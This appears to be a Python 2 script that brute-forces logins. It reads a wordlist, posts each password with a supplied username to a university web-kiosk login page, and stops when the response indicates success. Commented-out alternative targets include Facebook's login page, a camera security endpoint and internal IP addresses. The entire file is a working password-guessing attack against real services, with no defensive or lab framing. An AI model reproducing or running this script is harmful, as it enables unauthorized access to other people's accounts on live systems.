# python script.py username new_dict_words
# for facebook-- sitename is : "https://www.facebook.com/login.php?login_attempt=1&lwv=110"
import sys
import requests
from bs4 import BeautifulSoup as bs

#url='https://www.facebook.com/login.php?login_attempt=1&lwv=110'
#url='http://localhost/verify.php'
#url ='http://qwerty:qwerty@172.16.8.84/ISAPI/Security/userCheck?timeStamp=1536863758325'
#url='http://172.16.8.125/forms/doLogin'
#url='https://172.31.1.6:8090/login.xml'
url='https://webkiosk.thapar.edu/CommonFiles/UserAction.jsp'

def connect(url,m_data):
	#print "requesting data:"
	resp=requests.post(url,data=m_data)
	soup=bs(resp.text,'html.parser')
	x=soup.find_all('frame')
	if(len(x)!=0):
		print "\nPassword is "+m_data["Password"]
		sys.exit()
	resp = requests.post(url,data=m_data)
#	got_d=soup.find('p').get_text()
#	if got_d=="CORRECT":
#	print "The password is => "+m_data['pass']+ " <="
#		sys.exit()
#	else:
#		print m_data['pass']+" not working"


def controller():
	m={}
	dict_file=open('all_dict','r').read().split('\n')

	# for i in range(3,len(sys.argv)):
	# 		dict_file=[sys.argv[i]]+dict_file
	# for line in dict_file:
	# 	print str(line)

	count=1
	for line in dict_file:
		m["UserType"]="P"
		m["MemberCode"]=str(sys.argv[1])
		m["Password"]=str(line)
		chk="Trying "+ str(line)+", "+str(count)+" of "+str(len(dict_file))
		sys.stdout.write("\r\x1b[K"+chk)
		sys.stdout.flush()
		connect(url,m)
		count=count+1
controller()
	
